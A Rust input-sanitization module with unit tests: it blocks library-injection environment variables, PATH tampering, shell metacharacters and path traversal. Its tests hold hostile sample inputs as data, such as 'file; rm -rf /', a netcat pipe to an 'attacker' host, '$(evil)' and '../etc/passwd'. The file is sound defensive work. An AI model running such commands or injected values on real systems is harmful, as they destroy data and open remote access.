//! Input Sanitization Utilities
//!
//! General-purpose input sanitization for preventing command injection,
//! environment variable manipulation, and other input-based attacks.

use std::fmt;
use std::collections::HashSet;

/// Sanitization errors
#[derive(Debug, Clone, PartialEq)]
pub enum SanitizationError {
    ForbiddenCharacter(char),
    ForbiddenEnvironmentVariable(String),
    CommandInjection(String),
    InvalidInput(String),
}

impl fmt::Display for SanitizationError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            SanitizationError::ForbiddenCharacter(c) => {
                write!(f, "Forbidden character: '{}'", c)
            }
            SanitizationError::ForbiddenEnvironmentVariable(var) => {
                write!(f, "Forbidden environment variable: {}", var)
            }
            SanitizationError::CommandInjection(cmd) => {
                write!(f, "Command injection detected: {}", cmd)
            }
            SanitizationError::InvalidInput(msg) => {
                write!(f, "Invalid input: {}", msg)
            }
        }
    }
}

impl std::error::Error for SanitizationError {}

/// Input sanitizer for preventing various injection attacks
#[derive(Debug)]
pub struct InputSanitizer {
    forbidden_env_vars: HashSet<String>,
    shell_metacharacters: HashSet<char>,
}

impl InputSanitizer {
    pub fn new() -> Self {
        let mut forbidden_env_vars = HashSet::new();
        forbidden_env_vars.insert("LD_PRELOAD".to_string());
        forbidden_env_vars.insert("LD_LIBRARY_PATH".to_string());
        forbidden_env_vars.insert("DYLD_INSERT_LIBRARIES".to_string());
        forbidden_env_vars.insert("DYLD_LIBRARY_PATH".to_string());

        let mut shell_metacharacters = HashSet::new();
        for c in &[';', '&', '|', '`', '$', '(', ')', '<', '>', '\n', '\r'] {
            shell_metacharacters.insert(*c);
        }

        Self {
            forbidden_env_vars,
            shell_metacharacters,
        }
    }

    /// Validate environment variable name and value
    pub fn validate_env_var(&self, name: &str, value: &str) -> Result<(), SanitizationError> {
        // Check if variable name is forbidden
        if self.forbidden_env_vars.contains(name) {
            return Err(SanitizationError::ForbiddenEnvironmentVariable(
                name.to_string(),
            ));
        }

        // Check for PATH injection attempts
        if name == "PATH" && self.contains_path_injection(value) {
            return Err(SanitizationError::ForbiddenEnvironmentVariable(
                "PATH manipulation detected".to_string(),
            ));
        }

        Ok(())
    }

    /// Check if PATH value contains injection attempts
    fn contains_path_injection(&self, path: &str) -> bool {
        // Check for relative paths that could override system binaries
        path.starts_with(".")
            || path.starts_with("/tmp")
            || path.starts_with("/var/tmp")
            || path.contains(".:") // Current directory in PATH
    }

    /// Escape shell metacharacters in a string
    pub fn escape_shell_metacharacters(&self, input: &str) -> String {
        let mut escaped = String::with_capacity(input.len() * 2);

        for c in input.chars() {
            if self.shell_metacharacters.contains(&c) {
                escaped.push('\\');
            }
            escaped.push(c);
        }

        escaped
    }

    /// Detect command injection patterns
    pub fn contains_command_injection(&self, input: &str) -> bool {
        // Check for shell metacharacters
        if input.chars().any(|c| self.shell_metacharacters.contains(&c)) {
            return true;
        }

        // Check for common command injection patterns
        let patterns = [
            "$(", "${", "&&", "||", "; ", "| ", "> ", "< ",
        ];

        patterns.iter().any(|pattern| input.contains(pattern))
    }

    /// Validate command argument doesn't contain injection
    pub fn validate_command_arg(&self, arg: &str) -> Result<String, SanitizationError> {
        if self.contains_command_injection(arg) {
            return Err(SanitizationError::CommandInjection(arg.to_string()));
        }

        // Escape any remaining special characters
        Ok(self.escape_shell_metacharacters(arg))
    }

    /// Sanitize filename to prevent directory traversal and special characters
    pub fn sanitize_filename(&self, filename: &str) -> Result<String, SanitizationError> {
        // Check for path traversal
        if filename.contains("..") || filename.contains('/') || filename.contains('\\') {
            return Err(SanitizationError::InvalidInput(
                "Filename contains path separators".to_string(),
            ));
        }

        // Check for null bytes
        if filename.contains('\0') {
            return Err(SanitizationError::InvalidInput(
                "Filename contains null byte".to_string(),
            ));
        }

        // Remove any shell metacharacters
        let sanitized: String = filename
            .chars()
            .filter(|c| !self.shell_metacharacters.contains(c))
            .collect();

        if sanitized.is_empty() {
            return Err(SanitizationError::InvalidInput(
                "Filename becomes empty after sanitization".to_string(),
            ));
        }

        Ok(sanitized)
    }
}

impl Default for InputSanitizer {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_ld_preload_injection() {
        let sanitizer = InputSanitizer::new();
        let result = sanitizer.validate_env_var("LD_PRELOAD", "/tmp/evil.so");

        assert!(result.is_err());
        match result.unwrap_err() {
            SanitizationError::ForbiddenEnvironmentVariable(var) => {
                assert_eq!(var, "LD_PRELOAD");
            }
            _ => panic!("Expected ForbiddenEnvironmentVariable error"),
        }
    }

    #[test]
    fn detects_path_injection() {
        let sanitizer = InputSanitizer::new();
        let result = sanitizer.validate_env_var("PATH", "/tmp/evil:$PATH");

        assert!(result.is_err());
    }

    #[test]
    fn allows_safe_environment_variables() {
        let sanitizer = InputSanitizer::new();
        let result = sanitizer.validate_env_var("HOME", "/home/user");

        assert!(result.is_ok());
    }

    #[test]
    fn escapes_shell_metacharacters() {
        let sanitizer = InputSanitizer::new();
        let input = "file; rm -rf /";
        let escaped = sanitizer.escape_shell_metacharacters(input);

        assert!(escaped.contains("\\;"));
        assert!(!escaped.contains("; "));
    }

    #[test]
    fn detects_command_injection() {
        let sanitizer = InputSanitizer::new();

        assert!(sanitizer.contains_command_injection("program; rm -rf /"));
        assert!(sanitizer.contains_command_injection("program && malicious"));
        assert!(sanitizer.contains_command_injection("program | nc attacker 1234"));
        assert!(sanitizer.contains_command_injection("$(evil)"));
    }

    #[test]
    fn allows_safe_commands() {
        let sanitizer = InputSanitizer::new();

        assert!(!sanitizer.contains_command_injection("program.bin"));
        assert!(!sanitizer.contains_command_injection("file123.txt"));
        assert!(!sanitizer.contains_command_injection("normal-argument"));
    }

    #[test]
    fn validates_command_arguments() {
        let sanitizer = InputSanitizer::new();

        // Safe argument
        let result = sanitizer.validate_command_arg("file.txt");
        assert!(result.is_ok());

        // Malicious argument
        let result = sanitizer.validate_command_arg("file; rm -rf /");
        assert!(result.is_err());
    }

    #[test]
    fn sanitizes_filenames() {
        let sanitizer = InputSanitizer::new();

        // Safe filename
        assert!(sanitizer.sanitize_filename("document.pdf").is_ok());

        // Path traversal
        assert!(sanitizer.sanitize_filename("../etc/passwd").is_err());

        // Null byte
        assert!(sanitizer.sanitize_filename("file\0.txt").is_err());

        // Shell metacharacters
        let result = sanitizer.sanitize_filename("file;rm.txt");
        assert!(result.is_ok());
        assert!(!result.unwrap().contains(';'));
    }

    #[test]
    fn blocks_dyld_insert_libraries() {
        let sanitizer = InputSanitizer::new();
        let result = sanitizer.validate_env_var("DYLD_INSERT_LIBRARIES", "/tmp/evil.dylib");

        assert!(result.is_err());
    }

    #[test]
    fn detects_current_directory_in_path() {
        let sanitizer = InputSanitizer::new();

        // Current directory at start
        assert!(sanitizer.contains_path_injection(".:/usr/bin"));

        // Current directory in middle
        assert!(sanitizer.contains_path_injection("/usr/bin:.:/usr/local/bin"));
    }
}
